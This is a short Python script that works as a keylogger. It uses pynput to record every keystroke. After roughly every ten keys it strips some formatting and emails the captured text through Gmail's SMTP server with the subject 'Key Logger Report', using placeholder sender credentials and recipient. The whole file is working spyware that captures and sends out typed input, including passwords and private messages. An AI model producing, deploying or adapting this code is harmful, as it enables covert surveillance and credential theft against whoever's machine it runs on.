import pynput
import smtplib
from pynput.keyboard import Key, Listener


count = 0
keys = []

def on_press(key):
    print(key, end= " ")
    print("pressed")
    global keys, count
    keys.append(str(key))
    count += 1
    if count > 10:
        count = 0
        email(keys)

def sendmail(message):
        gmail_user = 'sender mail id'
        gmail_app_password='Two step verification password'

        sent_from = gmail_user
        sent_to = ['enter the receiver mail id']
        sent_subject = "Key Logger Report"
        sent_body = message

        email_text = """\
        From: %s
        To: %s
        Subject: %s
        %s
        """ % (sent_from, ", ".join(sent_to), sent_subject, sent_body)


        try:
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            server.ehlo()
            server.login(gmail_user, gmail_app_password)
            server.sendmail(sent_from, sent_to, email_text)
            server.close()

            print('Email sent!')
        except Exception as exception:
            print("Error: %s!\n\n" % exception)
          
def email(keys):
    message = ""
    for key in keys:
        k = key.replace("'","")
        if key == "Key.space":
            k = " " 
        elif key.find("Key")>0:
            k = ""
        message += k
    print(message)
    sendmail(message)

def on_release(key):
    if key == Key.esc:
        return False


with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()
